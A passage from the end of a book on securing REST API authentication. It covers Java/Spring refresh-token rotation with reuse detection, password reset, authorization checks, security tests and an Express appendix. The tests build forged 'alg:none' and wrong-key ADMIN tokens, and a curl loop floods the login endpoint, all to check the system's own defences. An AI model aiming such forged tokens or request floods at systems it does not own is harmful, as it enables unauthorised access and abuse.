        byte[] bytes = new byte[32];                     // 256 bits (Ch. 6.2)
        random.nextBytes(bytes);
        String raw = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);

        RefreshToken entity = new RefreshToken();
        entity.setUserId(user.getId());
        entity.setTokenHash(sha256(raw));                 // store the HASH only (6.3)
        entity.setFamilyId(familyId != null ? familyId : UUID.randomUUID());
        entity.setExpiresAt(Instant.now().plus(REFRESH_TTL));
        entity.setDeviceLabel(device);
        entity.setIpAddress(ip);
        repository.save(entity);

        // The raw value is returned ONCE and never stored or logged.
        return new IssuedToken(raw, entity.getFamilyId());
    }

    /** Validate and rotate. Throws on anything suspicious. */
    public RotationResult rotate(String rawToken, String device, String ip) {
        RefreshToken token = repository.findByTokenHash(sha256(rawToken))
            .orElseThrow(() -> new InvalidTokenException("Invalid refresh token"));

        // ---- THEFT DETECTION (Ch. 8.9, 14.6) ----
        // Already rotated away, yet presented again. Two parties hold this
        // token. We cannot tell which is legitimate, so we trust neither.
        if (token.getUsedAt() != null) {
            repository.revokeEntireFamily(token.getFamilyId(), Instant.now());
            auditService.record("security.token_reuse_detected", token.getUserId(), ip,
                                Map.of("family_id", token.getFamilyId()));
            alertService.notifySecurityTeam(token.getUserId());
            emailService.sendSuspiciousActivityAlert(token.getUserId());
            throw new TokenReuseException("Token reuse detected; all sessions revoked");
        }

        if (token.getRevokedAt() != null) throw new InvalidTokenException("Token revoked");
        if (token.getExpiresAt().isBefore(Instant.now()))
            throw new InvalidTokenException("Token expired");

        User user = userRepository.findById(token.getUserId()).orElseThrow();
        if (!user.isEnabled()) throw new InvalidTokenException("Account disabled");

        // Honour the global "log out everywhere" marker (section 15.2).
        if (token.getIssuedAt().isBefore(user.getTokensValidFrom()))
            throw new InvalidTokenException("Token invalidated");

        // ---- ROTATE: burn the old, mint a new one in the SAME family ----
        token.setUsedAt(Instant.now());
        repository.save(token);
        IssuedToken next = issue(user, token.getFamilyId(), device, ip);

        return new RotationResult(user, next);
    }

    private String sha256(String value) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256")
                .digest(value.getBytes(StandardCharsets.UTF_8));
            return HexFormat.of().formatHex(digest);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }
}
```

> **Note the `used_at` row is kept, not deleted.** Deleting rotated tokens would make a replayed stolen token indistinguishable from a random invalid one — the theft signal disappears entirely. Keep the row until its `expires_at` passes, then let a scheduled job clean it up. This is the same point made in Chapter 8, section 8.9.

**Password reset, with the two subtleties that matter:**

```java
@PostMapping("/forgot-password")
public ResponseEntity<?> forgotPassword(@Valid @RequestBody ForgotPasswordRequest req) {
    userRepository.findByEmail(req.email()).ifPresent(user -> {
        // Invalidate any outstanding reset tokens first, so a user who
        // clicks "forgot password" three times cannot leave three live
        // account-takeover links in their inbox.
        oneTimeTokenService.invalidateAll(user.getId(), Purpose.PASSWORD_RESET);
        String raw = oneTimeTokenService.create(user.getId(), Purpose.PASSWORD_RESET,
                                                 Duration.ofMinutes(30));
        emailService.sendPasswordReset(user.getEmail(), raw);
    });

    // ALWAYS the same response, whether or not the account exists, and
    // whether or not mail was sent — otherwise this endpoint becomes a
    // free account-enumeration oracle (Ch. 11.11).
    return ResponseEntity.ok(Map.of(
        "message", "If an account exists for that address, a reset link has been sent."
    ));
}

@PostMapping("/reset-password")
@Transactional
public ResponseEntity<?> resetPassword(@Valid @RequestBody ResetPasswordRequest req) {
    OneTimeToken token = oneTimeTokenService.consume(req.token(), Purpose.PASSWORD_RESET);
    User user = userRepository.findById(token.getUserId()).orElseThrow();

    passwordPolicy.validate(req.newPassword(), user);     // incl. breached check (14.1)
    user.setPasswordHash(passwordEncoder.encode(req.newPassword()));

    // A password reset is very often a REACTION to a suspected compromise.
    // Ending every other session is the whole point (Ch. 12.10).
    user.setTokensValidFrom(Instant.now());
    refreshTokenRepository.revokeAllForUser(user.getId(), Instant.now());
    userRepository.save(user);

    auditService.record("auth.password_reset", user.getId(), null, Map.of());
    emailService.sendPasswordChangedNotification(user.getEmail());  // out-of-band warning
    return ResponseEntity.ok(Map.of("message", "Password updated. Please log in again."));
}
```

---

## 15.6 Authorization — where role checks and ownership checks each belong

```java
@RestController
@RequestMapping("/api/loans")
public class LoanController {

    // Ownership check — a role alone cannot answer this, because the
    // answer depends on the DATA (Ch. 3, section 3.6).
    @GetMapping("/{id}")
    @PreAuthorize("@loanSecurity.canView(authentication, #id)")
    public LoanResponse getLoan(@PathVariable UUID id) { ... }

    // Scoped listing: filter in the QUERY, never with @PostFilter (Ch. 11.8).
    @GetMapping("/me")
    public List<LoanResponse> myLoans(@AuthenticationPrincipal AppUser me) {
        return loanService.findByUserId(me.getId());
    }

    // Pure role check — no data needed, so the annotation is sufficient.
    @GetMapping
    @PreAuthorize("hasAnyRole('LIBRARIAN','ADMIN')")
    public Page<LoanResponse> allLoans(Pageable pageable) { ... }
}

@Component("loanSecurity")
public class LoanSecurity {
    private final LoanRepository loans;

    // Plain Java: unit-testable without a Spring context (Ch. 11.8).
    public boolean canView(Authentication auth, UUID loanId) {
        AppUser me = (AppUser) auth.getPrincipal();
        boolean staff = auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_LIBRARIAN")
                        || a.getAuthority().equals("ROLE_ADMIN"));
        if (staff) return true;
        return loans.findById(loanId)
                    .map(l -> l.getUserId().equals(me.getId()))
                    .orElse(false);
    }
}
```

| Endpoint | Rule | Type |
|---|---|---|
| `POST /api/auth/*` | public | — |
| `GET /api/books` | any authenticated user | authorization (role) |
| `POST /api/books` | `LIBRARIAN`, `ADMIN` | authorization (role) |
| `DELETE /api/books/{id}` | `ADMIN` | authorization (role) |
| `GET /api/loans/me` | own loans, filtered in the query | authorization (ownership) |
| `GET /api/loans/{id}` | owner **or** staff | authorization (ownership) |
| `PATCH /api/users/{id}/role` | `ADMIN`, and never on oneself | authorization (role + rule) |

> **Common Mistake:** letting an admin change *their own* role, or demote the last remaining admin. Both are trivially reachable and both lock you out of your own system. Guard explicitly.

---

## 15.7 API documentation

**`POST /api/auth/register`**
```http
POST /api/auth/register HTTP/1.1
Content-Type: application/json

{"email":"anuj@example.com","password":"correct-horse-battery-staple","fullName":"Anuj Sharma"}

HTTP/1.1 201 Created
{"message":"Registration successful. Please check your email to verify your account."}
```
| Code | Meaning |
|---|---|
| 201 | Created (no tokens yet — verification required) |
| 400 | Validation failed (password policy, malformed email) |
| 409 | Email already registered *(see the note below)* |

> A `409` here **is** an enumeration oracle — it confirms an account exists. This is a deliberate, documented trade-off: registration is essentially unusable without telling the user their email is taken. Compensate with rate limiting and a CAPTCHA on this endpoint, and note it in your threat model rather than pretending it is not a leak.

**`POST /api/auth/login`**
```http
POST /api/auth/login HTTP/1.1
Content-Type: application/json

{"email":"anuj@example.com","password":"correct-horse-battery-staple"}

HTTP/1.1 200 OK
Set-Cookie: refresh_token=8Kd9...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh; Max-Age=1209600
Content-Type: application/json

{"accessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6...","tokenType":"Bearer","expiresIn":900,
 "user":{"id":"3f2a...","email":"anuj@example.com","fullName":"Anuj Sharma","role":"MEMBER"}}
```
| Code | Meaning |
|---|---|
| 200 | Success |
| 401 | Invalid credentials *(identical body for unknown user and wrong password)* |
| 403 | Email not verified, or account disabled |
| 429 | Rate limited — includes `Retry-After` |

**`POST /api/auth/refresh`**
```http
POST /api/auth/refresh HTTP/1.1
Cookie: refresh_token=8Kd9...
                                    (no request body — the cookie IS the credential)

HTTP/1.1 200 OK
Set-Cookie: refresh_token=Xm3p...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh
{"accessToken":"eyJ...","tokenType":"Bearer","expiresIn":900}
```
| Code | Meaning |
|---|---|
| 200 | Rotated; **the old refresh token is now dead** |
| 401 | Missing, invalid, expired, revoked — **or reuse detected**, which also kills every session in the family |

**`POST /api/auth/logout`** — revokes the presented refresh token. `POST /api/auth/logout-all` — bumps `tokens_valid_from` and revokes every refresh token for the user.

**Error envelope** — identical shape everywhere, so clients parse one thing:
```json
{"timestamp":"2026-08-05T09:12:31Z","status":401,"error":"unauthorized",
 "message":"Invalid credentials","path":"/api/auth/login","traceId":"a1b2c3d4"}
```
The `traceId` correlates to your logs; the `message` is safe to show a user and never reveals whether an account exists.

---

## 15.8 Testing what actually matters

The tests below are the ones that catch real security regressions. Notice that most of them assert on **failure** paths.

```java
@SpringBootTest
@AutoConfigureMockMvc
class AuthSecurityIT {

    @Test
    void protectedEndpointRejectsUnauthenticatedRequest() throws Exception {
        // THE test that would have caught Chapter 7's missing Depends() bug.
        // Write this FIRST for every protected endpoint you add.
        mockMvc.perform(get("/api/loans/me"))
               .andExpect(status().isUnauthorized());
    }

    @Test
    void memberCannotDeleteBook() throws Exception {
        mockMvc.perform(delete("/api/books/" + bookId)
                   .header("Authorization", "Bearer " + memberToken))
               .andExpect(status().isForbidden());   // 403, NOT 401 (Ch. 3)
    }

    @Test
    void memberCannotReadAnotherMembersLoan() throws Exception {
        // The IDOR test (Ch. 2, section 2.3). Every ownership-scoped
        // resource needs one of these.
        mockMvc.perform(get("/api/loans/" + otherUsersLoanId)
                   .header("Authorization", "Bearer " + memberToken))
               .andExpect(status().isForbidden());
    }

    @Test
    void reusedRefreshTokenRevokesEntireFamily() throws Exception {
        String first = login().refreshToken();
        String second = refresh(first).refreshToken();   // rotates; `first` is now used

        refreshExpectingStatus(first, 401);              // replay the old one -> theft
        refreshExpectingStatus(second, 401);             // the whole family is dead

        assertThat(auditLog.findByEventType("security.token_reuse_detected")).isNotEmpty();
    }

    @Test
    void loginFailuresAreIndistinguishable() throws Exception {
        var unknown = login("nobody@example.com", "whatever");
        var wrongPw = login("anuj@example.com", "wrong");

        assertThat(unknown.getStatus()).isEqualTo(wrongPw.getStatus());
        assertThat(unknown.getContentAsString()).isEqualTo(wrongPw.getContentAsString());
        // And check timing too — a missing user that skips the Argon2
        // comparison is measurably faster (Ch. 11.11).
    }

    @Test
    void expiredAccessTokenIsRejected() throws Exception {
        String expired = jwtService.createTokenExpiringAt(Instant.now().minusSeconds(1), userId);
        mockMvc.perform(get("/api/loans/me").header("Authorization", "Bearer " + expired))
               .andExpect(status().isUnauthorized());
    }

    @Test
    void tokenSignedWithWrongKeyIsRejected() throws Exception {
        String forged = forgeTokenWithDifferentKey(userId, "ADMIN");
        mockMvc.perform(get("/api/admin/users").header("Authorization", "Bearer " + forged))
               .andExpect(status().isUnauthorized());
    }

    @Test
    void algNoneTokenIsRejected() throws Exception {
        // The Ch. 8, section 8.7 attack, as an executable test.
        String unsigned = buildTokenWithHeader("{\"alg\":\"none\"}", userId, "ADMIN");
        mockMvc.perform(get("/api/admin/users").header("Authorization", "Bearer " + unsigned))
               .andExpect(status().isUnauthorized());
    }

    @Test
    void passwordResetInvalidatesAllExistingSessions() throws Exception {
        String refresh = login().refreshToken();
        resetPassword(userId, "a-brand-new-passphrase-here");
        refreshExpectingStatus(refresh, 401);
    }
}
```

> **Remember:** authentication tests must assert on rejection, not just acceptance. A happy-path-only suite passes perfectly against a system whose security layer is entirely disabled — which is exactly how the Chapter 7 `Depends()` bug survives code review. **For every protected endpoint, the first test you write should be the unauthenticated one.**

---

## 15.9 Deployment configuration

```yaml
# application.yml — no secrets, only references to injected environment variables
spring:
  datasource:
    url: ${DATABASE_URL}
    username: ${DATABASE_USER}
    password: ${DATABASE_PASSWORD}
  jpa:
    hibernate.ddl-auto: validate      # NEVER `update` in production — Flyway owns the schema

bookvault:
  jwt:
    issuer: https://api.bookvault.com
    audience: bookvault-api
    private-key: ${JWT_PRIVATE_KEY}    # RS256 (Ch. 8.5) — from a secrets manager
    public-key: ${JWT_PUBLIC_KEY}
    access-token-ttl: 15m               # Ch. 14.2
  refresh-token:
    ttl: 14d
    cookie-name: refresh_token
    cookie-path: /api/auth/refresh       # scoped: never sent to other endpoints
  password:
    argon2: { memory-kb: 65536, iterations: 3, parallelism: 4 }
    breached-check-enabled: true
  cors:
    allowed-origins: ${ALLOWED_ORIGINS}  # explicit list — never "*" (Ch. 12.7)

server:
  ssl.enabled: true
  forward-headers-strategy: framework    # so client IPs are correct behind a proxy;
                                          # otherwise per-IP rate limiting sees only
                                          # the load balancer and limits everyone at once

logging.level:
  org.springframework.security: INFO      # DEBUG leaks credentials — never in production
```

**Pre-launch verification** — run these against the deployed system, not localhost:

```bash
curl -I http://api.bookvault.com/api/books            # expect 301 -> https
curl -I https://api.bookvault.com/api/books           # expect HSTS + security headers
curl -i https://api.bookvault.com/api/loans/me        # expect 401, no token
curl -i https://api.bookvault.com/api/books \
     -H "Authorization: Bearer garbage"                # expect 401, not 500
for i in $(seq 1 30); do                                # expect 429 before 30
  curl -s -o /dev/null -w "%{http_code} " -X POST https://api.bookvault.com/api/auth/login \
       -H 'Content-Type: application/json' -d '{"email":"a@b.c","password":"x"}'
done
```

---

## Chapter 15 Summary

- A production authentication system is not one mechanism but a **composition**: JWT for stateless access, stored rotating refresh tokens for revocability, OIDC for federation, RBAC plus ownership checks for authorization, and an audit trail underneath all of it.
- **Schema decisions carry security weight**: nullable `password_hash` (federated-only users), `CITEXT` email (no duplicate accounts), `tokens_valid_from` (one-`UPDATE` global logout), `family_id` (theft detection), hashed token storage everywhere.
- **Access tokens are stateless; refresh tokens are stateful** — the deliberate trade-off from Chapter 8, section 8.10.
- **Refresh reuse revokes the whole family**, and the used row is retained precisely so the signal survives.
- **Password reset invalidates every session**, because a reset is usually a reaction to compromise.
- **Federated account linking by email is only safe when both sides are verified** — otherwise it is an account-takeover path.
- **Role checks belong in annotations; ownership checks belong next to the data**, and list endpoints must filter in the query.
- **Test the failure paths.** The first test for any protected endpoint is the unauthenticated one.

---

## Final Exercises

1. Build BookVault end to end. Start with registration and login; add refresh rotation next; add Google OIDC last.
2. Write every test from section 15.8 **before** the corresponding feature, and watch each one fail first.
3. Deliberately introduce three bugs from this book — a missing `Depends()`/`@PreAuthorize`, a missing `aud` check, and a `hasRole`/`hasAuthority` mismatch — and confirm your test suite catches all three. Any it misses is a gap in your suite.
4. Run the section 15.9 verification commands and fix everything that does not behave as expected.
5. Score the finished system against the Chapter 14, section 14.8 checklist and write up every remaining gap with a justification or a ticket.
6. Write the `RUNBOOK.md`: revoking a compromised account, rotating the signing key with zero downtime, and responding to a token-reuse alert.

---

## Where to go next

This book covered authentication for REST APIs from the protocol up. Natural extensions:

- **WebAuthn / Passkeys** — public-key authentication that removes the password entirely. Directly builds on Chapter 8's asymmetric signatures.
- **SAML 2.0** — the older enterprise federation standard you will meet in B2B integrations, solving Chapter 10's problem with XML instead of JWT.
- **Fine-grained authorization** — ReBAC and policy engines (OPA, Cedar, Zanzibar-style systems) for when RBAC's role bundles stop expressing your rules.
- **Zero-trust architecture** — the generalization of Chapter 13: never trust the network, verify every request, everywhere.
- **Threat modeling (STRIDE)** — a structured way to find the attacks Chapter 12 did not list for *your specific* system.

> **A closing note.** Every mechanism in this book will eventually be replaced by something better — Basic Auth already largely has been, and passwords themselves are on their way out. What does not change is the reasoning: HTTP is stateless, so identity must be proven on every request; credentials are only as safe as their weakest storage and transport; a bearer credential is only as safe as the shortest time it stays valid; and every check you skip is one an attacker eventually finds. Learn the reasoning and the next mechanism is a short read. Memorize only the mechanisms and you start over each time.

---

*End of Chapter 15. End of the book.*

---

# Appendix A — Node.js (Express) Implementations

## A.0 Why this appendix exists

The chapters use Python/FastAPI and Java/Spring Boot throughout, and switching stacks mid-book would have cost more in consistency than it gained in coverage. But Node.js is too common to omit — so this appendix ports **every scheme in the book** to Express, section by section, cross-referenced back to the chapter that explains the concept.

Nothing conceptual is introduced here. If a line surprises you, the explanation is in the referenced chapter — the mechanism is identical, only the syntax differs. That is the point worth internalizing: **these schemes are HTTP-level contracts, not framework features.**

```bash
npm install express jsonwebtoken bcrypt argon2 cookie-parser helmet \
            express-rate-limit jwks-rsa openid-client zod
```

---

## A.1 Basic Authentication (Chapter 5)

```js
import express from 'express';
import argon2 from 'argon2';
import crypto from 'node:crypto';

const app = express();

// Never plaintext — Ch. 5, section 5.7 / Ch. 12, section 12.2
const USERS = {
  anuj: { passwordHash: await argon2.hash('secret123') },
};

async function basicAuth(req, res, next) {
  const header = req.headers.authorization;

  if (!header?.startsWith('Basic ')) {
    // The WWW-Authenticate challenge — Ch. 5, section 5.4
    res.set('WWW-Authenticate', 'Basic realm="Books API"');
    return res.status(401).json({ error: 'Missing credentials' });
  }

  let username, password;
  try {
    // Base64 is ENCODING, not encryption — Ch. 5, section 5.3
    const decoded = Buffer.from(header.slice(6), 'base64').toString('utf8');
    const separator = decoded.indexOf(':');
    if (separator === -1) throw new Error('malformed');
    username = decoded.slice(0, separator);
    password = decoded.slice(separator + 1);   // a password may contain ':'
  } catch {
    // Malformed input must never produce a 500 — Ch. 5, section 5.5
    res.set('WWW-Authenticate', 'Basic realm="Books API"');
    return res.status(401).json({ error: 'Malformed credentials' });
  }

  const user = USERS[username];
  // Verify even when the user is absent, so response time does not reveal
  // whether the account exists — Ch. 11, section 11.11
  const ok = user
    ? await argon2.verify(user.passwordHash, password)
    : await argon2.verify(await argon2.hash('dummy'), 'wrong').catch(() => false);

  if (!ok) {
    res.set('WWW-Authenticate', 'Basic realm="Books API"');
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  req.user = { username };
  next();
}

app.get('/books', basicAuth, (req, res) => res.json([{ id: 1, title: 'Clean Code' }]));
```

---

## A.2 API Key Authentication (Chapter 6)

```js
import crypto from 'node:crypto';

// SHA-256 is correct for API keys (already 256 bits of entropy) but wrong
// for passwords — Ch. 6, section 6.3 and Ch. 12, section 12.2
const hashKey = (raw) => crypto.createHash('sha256').update(raw).digest('hex');

function generateApiKey(prefix = 'sk_live') {
  // randomBytes is a CSPRNG. Math.random() is NOT — never use it here.
  return `${prefix}_${crypto.randomBytes(32).toString('base64url')}`;
}

const API_KEYS = new Map();   // keyHash -> { owner, active }

function apiKeyAuth(req, res, next) {
  const key = req.get('X-API-Key');
  if (!key) return res.status(401).json({ error: 'Missing API key' });

  const record = API_KEYS.get(hashKey(key));
  if (!record?.active) return res.status(401).json({ error: 'Invalid or revoked API key' });

  req.apiClient = record;
  next();
}
```

Rate limiting keyed on the API key (Chapter 6, section 6.6):

```js
import rateLimit from 'express-rate-limit';

const perKeyLimit = rateLimit({
  windowMs: 60_000,
  limit: 100,
  standardHeaders: 'draft-7',      // emits RateLimit-* and Retry-After
  keyGenerator: (req) => req.get('X-API-Key') ?? req.ip,
  // In production, back this with Redis — an in-memory store is per-process
  // and resets on restart (Ch. 6, section 6.6).
});

app.get('/books', apiKeyAuth, perKeyLimit, handler);
```

---

## A.3 Sessions and Cookies (Chapter 7)

```js
import cookieParser from 'cookie-parser';
import crypto from 'node:crypto';

app.use(cookieParser());
app.use(express.json());

const SESSIONS = new Map();               // Redis in production
const IDLE_MS = 30 * 60 * 1000;
const ABSOLUTE_MS = 8 * 60 * 60 * 1000;

app.post('/login', async (req, res) => {
  const { username, password } = req.body;    // BODY, never the query string
  const user = USERS[username];
  if (!user || !(await argon2.verify(user.passwordHash, password))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // A FRESH id on every login — defeats session fixation (Ch. 7, section 7.8)
  const sessionId = crypto.randomBytes(32).toString('base64url');
  const now = Date.now();
  SESSIONS.set(sessionId, { username, lastActivity: now, absoluteExpiry: now + ABSOLUTE_MS });

  res.cookie('session_id', sessionId, {
    httpOnly: true,        // XSS cannot read it — Ch. 7, section 7.5
    secure: true,          // HTTPS only
    sameSite: 'lax',       // CSRF mitigation — Ch. 12, section 12.6
    maxAge: IDLE_MS,
    path: '/',
  });
  res.json({ message: 'logged in' });
});

function requireSession(req, res, next) {
  const id = req.cookies.session_id;
  const session = id && SESSIONS.get(id);
  if (!session) return res.status(401).json({ error: 'Not logged in' });

  const now = Date.now();
  // BOTH timers — Ch. 7, section 7.7
  if (now > session.lastActivity + IDLE_MS || now > session.absoluteExpiry) {
    SESSIONS.delete(id);
    return res.status(401).json({ error: 'Session expired' });
  }

  session.lastActivity = now;      // slide the idle window
  req.user = { username: session.username };
  next();
}

app.post('/logout', (req, res) => {
  // Server-side deletion is what actually ends the session (Ch. 7, section 7.6)
  if (req.cookies.session_id) SESSIONS.delete(req.cookies.session_id);
  // Clearing must match the original path/flags or the cookie survives.
  res.clearCookie('session_id', { path: '/', httpOnly: true, secure: true, sameSite: 'lax' });
  res.json({ message: 'logged out' });
});
```

---

## A.4 JWT Authentication (Chapter 8)

```js
import jwt from 'jsonwebtoken';

const ACCESS_TTL = '15m';                       // Ch. 14, section 14.2
const SECRET = process.env.JWT_SECRET;           // never hardcoded — Ch. 8, section 8.11

function createAccessToken(userId, role) {
  return jwt.sign({ sub: userId, role }, SECRET, {
    algorithm: 'HS256',
    expiresIn: ACCESS_TTL,
    issuer: 'api.bookvault.com',
    audience: 'bookvault-api',
  });
}

function jwtAuth(req, res, next) {
  const header = req.headers.authorization;
  if (!header?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing token' });
  }

  try {
    req.user = jwt.verify(header.slice(7), SECRET, {
      // PINNED, never read from the token itself. Without this, a token
      // claiming {"alg":"none"} could bypass verification entirely —
      // Ch. 8, section 8.7.
      algorithms: ['HS256'],
      issuer: 'api.bookvault.com',
      audience: 'bookvault-api',       // Ch. 13, section 13.6
      clockTolerance: 30,               // seconds — clock skew, Ch. 13, section 13.10
    });
    next();
  } catch (err) {
    const expired = err.name === 'TokenExpiredError';
    return res.status(401).json({ error: expired ? 'Token expired' : 'Invalid token' });
  }
}

// Role check — Ch. 3, section 3.6. Note the 403, not 401.
const requireRole = (...roles) => (req, res, next) =>
  roles.includes(req.user.role)
    ? next()
    : res.status(403).json({ error: 'Insufficient permissions' });

app.delete('/api/books/:id', jwtAuth, requireRole('ADMIN'), handler);
```

**Refresh rotation with reuse detection** (Chapter 8, section 8.9):

```js
const REFRESH = new Map();       // tokenHash -> { userId, familyId, usedAt, expiresAt }

app.post('/api/auth/refresh', async (req, res) => {
  const raw = req.cookies.refresh_token;
  const record = raw && REFRESH.get(hashKey(raw));
  if (!record) return res.status(401).json({ error: 'Invalid refresh token' });

  // Presented twice => two parties hold it => theft. Trust neither.
  if (record.usedAt) {
    for (const [h, r] of REFRESH) if (r.familyId === record.familyId) REFRESH.delete(h);
    await auditLog('security.token_reuse_detected', record.userId);
    return res.status(401).json({ error: 'Token reuse detected; all sessions revoked' });
  }
  if (Date.now() > record.expiresAt) return res.status(401).json({ error: 'Token expired' });

  record.usedAt = Date.now();                       // burn it, but KEEP the row
  const next = issueRefreshToken(record.userId, record.familyId);

  res.cookie('refresh_token', next, {
    httpOnly: true, secure: true, sameSite: 'strict',
    path: '/api/auth/refresh',        // scoped — never sent to other endpoints
  });
  res.json({ accessToken: createAccessToken(record.userId, 'MEMBER'), expiresIn: 900 });
});
```

---

## A.5 OAuth 2.0 / OIDC (Chapters 9–10)

```js
import * as client from 'openid-client';

// Discovery fetches every endpoint and the JWKS URI — Ch. 10, section 10.4
const config = await client.discovery(
  new URL('https://accounts.google.com'),
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
);

// `async` matters: calculatePKCECodeChallenge below is awaited, and an
// `await` inside a non-async handler is a syntax error, not a runtime one —
// the file will not even load.
app.get('/auth/google', async (req, res) => {
  const state = client.randomState();
  const codeVerifier = client.randomPKCECodeVerifier();      // Ch. 9, section 9.7

  // Bound to THIS browser, not a server-global set — the global-set version
  // is not a real CSRF defence (Ch. 9, section 9.10).
  res.cookie('oauth_tx', JSON.stringify({ state, codeVerifier }), {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: 600_000,
  });

  const url = client.buildAuthorizationUrl(config, {
    redirect_uri: 'https://bookvault.com/auth/google/callback',
    scope: 'openid email profile',        // "openid" is what makes this OIDC
    state,
    code_challenge: await client.calculatePKCECodeChallenge(codeVerifier),
    code_challenge_method: 'S256',
  });
  res.redirect(url.href);
});

app.get('/auth/google/callback', async (req, res) => {
  const tx = req.cookies.oauth_tx && JSON.parse(req.cookies.oauth_tx);
  if (!tx) return res.status(400).json({ error: 'invalid_state' });
  res.clearCookie('oauth_tx');

  // The library verifies the id_token signature (via JWKS), iss, aud, exp,
  // and the state/PKCE binding — Ch. 10, sections 10.3 and 10.7.
  const tokens = await client.authorizationCodeGrant(config, new URL(req.url, 'https://bookvault.com'), {
    pkceCodeVerifier: tx.codeVerifier,
    expectedState: tx.state,
  });

  const claims = tokens.claims();
  // Key on `sub`, NEVER on email — emails change (Ch. 10, section 10.9).
  // And require email_verified before linking to any existing account
  // (Ch. 15, section 15.4).
  const user = await findOrCreateUser({
    provider: 'google',
    sub: claims.sub,
    email: claims.email,
    emailVerified: claims.email_verified === true,
  });

  // Now issue OUR OWN tokens — Google's are for calling Google.
  res.json({ accessToken: createAccessToken(user.id, user.role) });
});
```

---

## A.6 Security middleware (Chapter 12)

```js
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

// All six headers from Ch. 12, section 12.11
app.use(helmet({
  hsts: { maxAge: 31536000, includeSubDomains: true },
  contentSecurityPolicy: {
    directives: { defaultSrc: ["'self'"], frameAncestors: ["'none'"], objectSrc: ["'none'"] },
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// CORS: explicit allowlist. Never reflect the Origin header — Ch. 12, section 12.7
import cors from 'cors';
app.use(cors({
  origin: ['https://app.bookvault.com'],
  credentials: true,
  allowedHeaders: ['Authorization', 'Content-Type'],
}));

// Layered rate limiting — Ch. 12, section 12.5
app.use('/api/auth/login', rateLimit({
  windowMs: 15 * 60_000,
  limit: 5,
  skipSuccessfulRequests: true,     // only failures count toward the limit
  keyGenerator: (req) => `${req.ip}:${req.body?.email ?? ''}`,
  message: { error: 'Too many attempts. Try again later.' },
}));

// Redact credentials from logs — Ch. 12, section 12.10 / Ch. 14, section 14.5
app.use((req, res, next) => {
  const safe = { ...req.headers };
  delete safe.authorization;
  delete safe.cookie;
  logger.info({ method: req.method, path: req.path, headers: safe });
  next();
});
```

> **Common Mistake specific to Express — trusting `req.ip` behind a proxy.** By default, `req.ip` behind a load balancer is the *proxy's* address, so per-IP rate limiting throttles every user as if they were one client, and your logs record the wrong source for every request. Set `app.set('trust proxy', 1)` (matching your actual number of proxy hops). Setting it to `true` blindly is the opposite mistake: it trusts a client-supplied `X-Forwarded-For`, letting an attacker spoof any IP and bypass rate limiting entirely.

---

## A.7 Cross-stack reference

| Concept | FastAPI (Python) | Spring Boot (Java) | Express (Node.js) |
|---|---|---|---|
| Read a header | `Header(default=None)` | `@RequestHeader` | `req.get('X-Foo')` |
| Read a cookie | `Cookie(default=None)` | `@CookieValue` | `req.cookies.foo` |
| Set a cookie | `response.set_cookie(...)` | `ResponseCookie.from(...)` | `res.cookie(...)` |
| Reusable auth check | `Depends(fn)` | `SecurityFilterChain` / filter | middleware `(req,res,next)` |
| Password hashing | `argon2-cffi`, `bcrypt` | `Argon2PasswordEncoder` | `argon2`, `bcrypt` |
| JWT | `PyJWT` | `jjwt` / `nimbus-jose-jwt` | `jsonwebtoken` |
| JWKS fetching | `PyJWKClient` | `NimbusJwtDecoder` | `jwks-rsa`, `openid-client` |
| OIDC client | `authlib`, `httpx` | `spring-boot-starter-oauth2-client` | `openid-client` |
| CSPRNG | `secrets.token_urlsafe` | `SecureRandom` | `crypto.randomBytes` |
| Constant-time compare | `secrets.compare_digest` | `MessageDigest.isEqual` | `crypto.timingSafeEqual` |
| Rate limiting | `slowapi` | Bucket4j / Resilience4j | `express-rate-limit` |
| Security headers | middleware | `http.headers(...)` | `helmet` |

> **Remember:** every row above is the *same idea* in three syntaxes. The wire format — `Authorization: Bearer <token>`, `Set-Cookie: ...; HttpOnly; Secure; SameSite=Lax`, a `401` versus a `403` — is identical regardless of stack, which is exactly why this book taught the protocol before any framework. A scheme you understand at the HTTP level ports to any language in an afternoon.

---

*End of Appendix A.*
